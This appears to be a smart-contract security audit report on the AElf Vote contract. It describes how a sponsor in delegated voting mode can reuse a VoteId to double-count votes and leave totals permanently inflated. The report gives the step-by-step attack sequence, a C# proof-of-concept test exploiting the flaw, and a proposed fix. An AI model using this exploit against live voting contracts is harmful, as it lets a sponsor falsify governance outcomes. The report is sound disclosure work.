# Audit Report

## Title
Vote Record Overwrite Enables Double-Counting in Delegated Voting

## Summary
The Vote contract allows sponsors to call `Vote()` multiple times with identical VoteIds but different voters in delegated voting mode (IsLockToken=false). Each call overwrites the previous voting record while unconditionally incrementing vote totals, causing permanent vote count inflation that persists after withdrawal.

## Finding Description

In delegated voting mode, the Vote contract accepts sponsor-provided VoteIds without validating uniqueness. [1](#0-0) 

The voting record is unconditionally overwritten at the storage assignment, replacing any previous record with the same VoteId. [2](#0-1) 

The `UpdateVotingResult()` method unconditionally increments vote tallies (Results[option], VotersCount, VotesAmount) regardless of whether the VoteId already contributed to the totals. [3](#0-2) 

The `UpdateVotedItems()` method adds VoteIds to voters' ActiveVotes lists without preventing duplicates across different voters. [4](#0-3) 

**Attack Sequence:**
1. Sponsor creates delegated voting item via `Register()` with IsLockToken=false
2. Sponsor calls `Vote(VoteId=X, Voter=Alice, Amount=100, Option="A")`
   - Stores VotingRecords[X] = {Voter: Alice, Amount: 100}
   - Increments Results["A"] += 100, VotersCount += 1, VotesAmount += 100
3. Sponsor calls `Vote(VoteId=X, Voter=Bob, Amount=50, Option="A")` using the SAME VoteId
   - Overwrites VotingRecords[X] = {Voter: Bob, Amount: 50}
   - Increments Results["A"] += 50, VotersCount += 1, VotesAmount += 50 AGAIN
4. Final state: Results["A"] = 150, but VotingRecords[X] only shows Bob with 50

When withdrawal occurs, only Bob's 50 is subtracted from results, leaving Results["A"] = 100 permanently inflated. Alice retains X in her ActiveVotes but cannot recover it since the record shows Bob as the owner. [5](#0-4) 

**Comparison with Regular Voting:**
Regular voting (IsLockToken=true) generates unique VoteIds using `Context.GenerateId()`, preventing this vulnerability. [6](#0-5) 

**Election Contract Protection:**
The Election contract implements duplicate VoteId checks, but this protection is not enforced in the base Vote contract. [7](#0-6) 

## Impact Explanation

**Vote Integrity Compromise**: Sponsors can artificially inflate vote totals by reusing VoteIds with different voters, creating phantom votes that manipulate voting outcomes without corresponding voting records.

**Permanent State Corruption**: Inflated vote counts persist indefinitely. Withdrawal removes only the final voter's amount, leaving previously counted votes permanently inflated in Results.

**Orphaned Vote Tracking**: Previous voters retain VoteIds in their ActiveVotes lists but cannot withdraw them since records show different voters as owners, creating irrecoverable state inconsistencies.

**Governance Impact**: While the Election contract has specific protections, any custom voting items created using delegated voting are vulnerable. This affects:
- Custom governance proposals using delegated voting
- Third-party voting systems built on the Vote contract  
- Any delegated voting scenario where the sponsor is untrusted

The vulnerability breaks fundamental voting guarantees: vote count integrity, state consistency between records and aggregated results, and correct withdrawal mechanics.

## Likelihood Explanation

**Attack Feasibility**: The exploit requires only that a sponsor create a delegated voting item by calling `Register()` with IsLockToken=false, then repeatedly call `Vote()` with the same VoteId but different voters. No special permissions beyond sponsor status are needed, and any user can become a sponsor.

**Attacker Profile**: Any user can become a sponsor by calling the public `Register()` method on the Vote contract. The attack is straightforward—repeatedly invoke `Vote()` with a reused VoteId and varying voter addresses.

**Detection Difficulty**: The attack leaves minimal on-chain traces since the VotingRecords mapping only retains the final state after overwrites. Off-chain monitoring would need to track all Vote() transactions and detect VoteId reuse across different voters in real-time.

**Economic Constraints**: Creating a delegated voting item requires minimal resources—only standard transaction fees. The sponsor controls voting permissions in delegated mode, making the attack trivial to execute.

**Real-World Context**: While the core Election contract implements VoteId uniqueness checks, the base Vote contract is designed as a reusable component. Any custom voting implementation using delegated voting without implementing similar duplicate protections would be vulnerable to this attack.

## Recommendation

Add duplicate VoteId validation in `AssertValidVoteInput()` for delegated voting:

```csharp
if (!votingItem.IsLockToken)
{
    Assert(votingItem.Sponsor == Context.Sender, "Sender of delegated voting event must be the Sponsor.");
    Assert(input.Voter != null, "Voter cannot be null if voting event is delegated.");
    Assert(input.VoteId != null, "Vote Id cannot be null if voting event is delegated.");
    
    // Add duplicate check
    Assert(State.VotingRecords[input.VoteId] == null || 
           State.VotingRecords[input.VoteId].IsWithdrawn, 
           "Vote Id already exists.");
}
```

This check ensures each VoteId can only be used once (or reused only after withdrawal), preventing double-counting while maintaining legitimate use cases.

## Proof of Concept

```csharp
[Fact]
public async Task VoteDoubleCountingExploit()
{
    // Setup: Create delegated voting item
    var votingItemId = await RegisterDelegatedVotingItem(IsLockToken: false);
    
    var voteId = HashHelper.ComputeFrom("duplicate-vote-id");
    var alice = Accounts[1].Address;
    var bob = Accounts[2].Address;
    
    // Step 1: Sponsor votes for Alice with amount 100
    await VoteContract.Vote.SendAsync(new VoteInput
    {
        VotingItemId = votingItemId,
        VoteId = voteId,
        Voter = alice,
        Amount = 100,
        Option = "OptionA"
    });
    
    // Verify initial results
    var result1 = await GetVotingResult(votingItemId);
    result1.Results["OptionA"].ShouldBe(100);
    result1.VotersCount.ShouldBe(1);
    
    // Step 2: Sponsor votes AGAIN with SAME VoteId for Bob with amount 50
    await VoteContract.Vote.SendAsync(new VoteInput
    {
        VotingItemId = votingItemId,
        VoteId = voteId,  // SAME VoteId!
        Voter = bob,
        Amount = 50,
        Option = "OptionA"
    });
    
    // Verify double-counting occurred
    var result2 = await GetVotingResult(votingItemId);
    result2.Results["OptionA"].ShouldBe(150); // 100 + 50, but should be 50!
    result2.VotersCount.ShouldBe(2); // Should be 1!
    
    // Step 3: Verify record shows only Bob
    var record = await VoteContract.GetVotingRecord.CallAsync(voteId);
    record.Voter.ShouldBe(bob); // Alice's record was overwritten
    record.Amount.ShouldBe(50);
    
    // Step 4: Withdraw Bob's vote
    await VoteContract.Withdraw.SendAsync(new WithdrawInput { VoteId = voteId });
    
    // Verify permanent inflation - Alice's 100 remains!
    var result3 = await GetVotingResult(votingItemId);
    result3.Results["OptionA"].ShouldBe(100); // Should be 0, permanently inflated!
}
```

This test demonstrates that:
1. Calling `Vote()` twice with the same VoteId but different voters causes Results to increment twice (150 total)
2. The VotingRecord only retains the last voter (Bob)
3. Withdrawing removes only Bob's amount (50), leaving Alice's amount (100) permanently inflated in Results

### Citations

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L117-117)
```csharp
        State.VotingRecords[input.VoteId] = votingRecord;
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L146-161)
```csharp
    private void UpdateVotedItems(Hash voteId, Address voter, VotingItem votingItem)
    {
        var votedItems = State.VotedItemsMap[voter] ?? new VotedItems();
        var voterItemIndex = votingItem.VotingItemId.ToHex();
        if (votedItems.VotedItemVoteIds.ContainsKey(voterItemIndex))
            votedItems.VotedItemVoteIds[voterItemIndex].ActiveVotes.Add(voteId);
        else
            votedItems.VotedItemVoteIds[voterItemIndex] =
                new VotedIds
                {
                    ActiveVotes = { voteId }
                };

        votedItems.VotedItemVoteIds[voterItemIndex].WithdrawnVotes.Remove(voteId);
        State.VotedItemsMap[voter] = votedItems;
    }
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L169-181)
```csharp
    private void UpdateVotingResult(VotingItem votingItem, string option, long amount)
    {
        // Update VotingResult based on this voting behaviour.
        var votingResultHash = GetVotingResultHash(votingItem.VotingItemId, votingItem.CurrentSnapshotNumber);
        var votingResult = State.VotingResults[votingResultHash];
        if (!votingResult.Results.ContainsKey(option)) votingResult.Results.Add(option, 0);

        var currentVotes = votingResult.Results[option];
        votingResult.Results[option] = currentVotes.Add(amount);
        votingResult.VotersCount = votingResult.VotersCount.Add(1);
        votingResult.VotesAmount = votingResult.VotesAmount.Add(amount);
        State.VotingResults[votingResultHash] = votingResult;
    }
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L191-239)
```csharp
    public override Empty Withdraw(WithdrawInput input)
    {
        var votingRecord = State.VotingRecords[input.VoteId];
        if (votingRecord == null) throw new AssertionException("Voting record not found.");
        var votingItem = State.VotingItems[votingRecord.VotingItemId];

        if (votingItem.IsLockToken)
            Assert(votingRecord.Voter == Context.Sender, "No permission to withdraw votes of others.");
        else
            Assert(votingItem.Sponsor == Context.Sender, "No permission to withdraw votes of others.");

        // Update VotingRecord.
        votingRecord.IsWithdrawn = true;
        votingRecord.WithdrawTimestamp = Context.CurrentBlockTime;
        State.VotingRecords[input.VoteId] = votingRecord;

        var votingResultHash = GetVotingResultHash(votingRecord.VotingItemId, votingRecord.SnapshotNumber);

        var votedItems = State.VotedItemsMap[votingRecord.Voter];
        votedItems.VotedItemVoteIds[votingItem.VotingItemId.ToHex()].ActiveVotes.Remove(input.VoteId);
        votedItems.VotedItemVoteIds[votingItem.VotingItemId.ToHex()].WithdrawnVotes.Add(input.VoteId);
        State.VotedItemsMap[votingRecord.Voter] = votedItems;

        var votingResult = State.VotingResults[votingResultHash];
        votingResult.Results[votingRecord.Option] =
            votingResult.Results[votingRecord.Option].Sub(votingRecord.Amount);
        if (!votedItems.VotedItemVoteIds[votingRecord.VotingItemId.ToHex()].ActiveVotes.Any())
            votingResult.VotersCount = votingResult.VotersCount.Sub(1);

        votingResult.VotesAmount = votingResult.VotesAmount.Sub(votingRecord.Amount);

        State.VotingResults[votingResultHash] = votingResult;

        if (votingItem.IsLockToken)
            State.TokenContract.Unlock.Send(new UnlockInput
            {
                Address = votingRecord.Voter,
                Symbol = votingItem.AcceptedCurrency,
                Amount = votingRecord.Amount,
                LockId = input.VoteId
            });

        Context.Fire(new Withdrawn
        {
            VoteId = input.VoteId
        });

        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L384-389)
```csharp
        if (!votingItem.IsLockToken)
        {
            Assert(votingItem.Sponsor == Context.Sender, "Sender of delegated voting event must be the Sponsor.");
            Assert(input.Voter != null, "Voter cannot be null if voting event is delegated.");
            Assert(input.VoteId != null, "Vote Id cannot be null if voting event is delegated.");
        }
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L390-398)
```csharp
        else
        {
            var votingResultHash = GetVotingResultHash(votingItem.VotingItemId, votingItem.CurrentSnapshotNumber);
            var votingResult = State.VotingResults[votingResultHash];
            // Voter = Transaction Sender
            input.Voter = Context.Sender;
            // VoteId = Transaction Id;
            input.VoteId = Context.GenerateId(Context.Self, votingResult.VotesAmount.ToBytes(false));
        }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Elector.cs (L433-433)
```csharp
        Assert(State.LockTimeMap[voteId] == 0, "Vote already exists.");
```
